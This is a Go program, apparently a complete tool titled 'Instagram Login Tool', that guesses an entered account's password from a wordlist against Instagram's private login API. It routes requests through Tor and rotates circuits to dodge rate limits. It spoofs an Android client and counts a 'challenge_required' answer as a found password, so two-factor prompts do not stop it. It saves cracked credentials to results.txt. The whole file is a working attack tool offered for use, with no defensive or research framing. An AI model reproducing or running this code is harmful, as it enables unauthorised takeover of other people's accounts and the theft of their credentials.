package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
	"golang.org/x/net/proxy"
)

const (
	API_URL      = "https://i.instagram.com/api/v1/"
	USER_AGENT   = "Instagram 76.0.0.15.395 Android (24/7.0; 640dpi; 1440x2560; samsung; SM-G930F; herolte; samsungexynos8890; en_US; 138226743)"
	TIMEOUT      = 10 * time.Second
	CURRENT_TIME = "2025-05-24 12:06:12"
	CURRENT_USER = "monsmain"
	TOR_PROXY    = "socks5://127.0.0.1:9150"
)

type InstagramResponse struct {
	Status     string `json:"status"`
	Message    string `json:"message"`
	ErrorType  string `json:"error_type"`
	ErrorTitle string `json:"error_title"`
	Challenge  struct {
		URL string `json:"url"`
	} `json:"challenge"`
}

func main() {
	logFile, err := os.OpenFile("debug.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err == nil {
		log.SetOutput(logFile)
		defer logFile.Close()
	}

	fmt.Println("=== Instagram Login Tool ===")
	fmt.Printf("Time: %s\n", CURRENT_TIME)
	fmt.Printf("User: %s\n\n", CURRENT_USER)

	// تست اتصال به Tor
	fmt.Println("Testing Tor connection...")
	_, err = getTorClient()
	if err != nil {
		fmt.Printf("❌ Error connecting to Tor: %v\n", err)
		fmt.Println("Please make sure Tor Browser is running!")
		return
	}
	fmt.Println("✅ Successfully connected to Tor\n")

	var username string
	fmt.Print("Enter Instagram username: ")
	fmt.Scanln(&username)

	passwords := loadPasswords()
	if len(passwords) == 0 {
		fmt.Println("No passwords found in password.txt!")
		return
	}

	fmt.Printf("\nLoaded %d passwords\n", len(passwords))
	fmt.Println("\nStarting login attempts...\n")

	for i, password := range passwords {
		fmt.Printf("[%d/%d] Testing password: %s\n", i+1, len(passwords), maskPassword(password))

		// تغییر IP هر 10 درخواست (در Tor Browser این کار خودکار انجام می‌شود)
		if i > 0 && i%10 == 0 {
			fmt.Println("\n🔄 Getting new Tor circuit...")
			time.Sleep(5 * time.Second)
			fmt.Println("✅ Ready with new IP")
		}

		success, response := tryLogin(username, password)

		if success || response.Message == "challenge_required" || response.ErrorType == "challenge_required" {
			fmt.Printf("\n✅ PASSWORD FOUND: %s\n", password)
			fmt.Printf("Username: %s\n", username)
			fmt.Println("✅ Password is correct! (2FA/Challenge Required)")
			saveResult(username, password, true)
			return
		} else {
			// نمایش کامل ریسپانس و وضعیت HTTP برای عیب‌یابی
			fmt.Printf("⚠️ Error: %s | ErrorType: %s\n", response.Message, response.ErrorType)
			fmt.Printf("⚠️ Full Response: %+v\n", response)
		}

		time.Sleep(time.Duration(rand.Intn(5)+5) * time.Second)
	}

	fmt.Println("\n❌ No valid password found!")
	saveResult(username, "", false)
}

func getTorClient() (*http.Client, error) {
	torProxy, err := url.Parse(TOR_PROXY)
	if err != nil {
		return nil, fmt.Errorf("error parsing tor proxy url: %v", err)
	}

	dialer, err := proxy.FromURL(torProxy, proxy.Direct)
	if err != nil {
		return nil, fmt.Errorf("error creating tor proxy dialer: %v", err)
	}

	transport := &http.Transport{
		Dial: dialer.Dial,
	}

	return &http.Client{
		Transport: transport,
		Timeout:   TIMEOUT,
	}, nil
}

func tryLogin(username, password string) (bool, InstagramResponse) {
	client, err := getTorClient()
	if err != nil {
		log.Printf("Error creating Tor client: %v\n", err)
		fmt.Printf("Tor client error: %v\n", err)
		return false, InstagramResponse{}
	}

	loginUrl := API_URL + "accounts/login/"

	data := url.Values{}
	data.Set("username", username)
	data.Set("password", password)
	data.Set("device_id", fmt.Sprintf("android-%d", time.Now().UnixNano()))

	req, err := http.NewRequest("POST", loginUrl, strings.NewReader(data.Encode()))
	if err != nil {
		log.Printf("Error creating request: %v\n", err)
		fmt.Printf("Request error: %v\n", err)
		return false, InstagramResponse{}
	}

	req.Header.Set("User-Agent", USER_AGENT)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Language", "en-US")
	req.Header.Set("X-IG-Capabilities", "3brTvw==")
	req.Header.Set("X-IG-Connection-Type", "WIFI")

	resp, err := client.Do(req)
	if err != nil {
		log.Printf("Error sending request: %v\n", err)
		fmt.Printf("HTTP request error: %v\n", err)
		return false, InstagramResponse{}
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Printf("Error reading response: %v\n", err)
		fmt.Printf("Read body error: %v\n", err)
		return false, InstagramResponse{}
	}

	// اینجا را اضافه کن
	fmt.Printf("HTTP Status: %d\nRaw body: %s\n", resp.StatusCode, string(body))
	log.Printf("HTTP Status: %d\nRaw body: %s\n", resp.StatusCode, string(body))

	var response InstagramResponse
	if err := json.Unmarshal(body, &response); err != nil {
		log.Printf("Error parsing response: %v\n", err)
		fmt.Printf("JSON parse error: %v\n", err)
	}

	success := response.Status == "ok" ||
		strings.Contains(string(body), "logged_in_user")

	return success, response
}

func loadPasswords() []string {
	file, err := os.Open("password.txt")
	if err != nil {
		log.Printf("Error opening password file: %v", err)
		return []string{}
	}
	defer file.Close()

	var passwords []string
	scanner := bufio.NewScanner(file)

	for scanner.Scan() {
		pass := strings.TrimSpace(scanner.Text())
		if pass != "" {
			passwords = append(passwords, pass)
		}
	}

	return passwords
}

func saveResult(username, password string, success bool) {
	currentTime := CURRENT_TIME
	var status string
	if success {
		status = "✅ SUCCESS"
	} else {
		status = "❌ FAILED"
	}

	logEntry := fmt.Sprintf("[%s] %s\nUsername: %s\nPassword: %s\n\n",
		currentTime, status, username, password)

	file, err := os.OpenFile("results.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Printf("Error saving result: %v", err)
		return
	}
	defer file.Close()

	file.WriteString(logEntry)
}

func maskPassword(password string) string {
	if len(password) <= 4 {
		return "****"
	}
	return password[:2] + strings.Repeat("*", len(password)-4) + password[len(password)-2:]
}
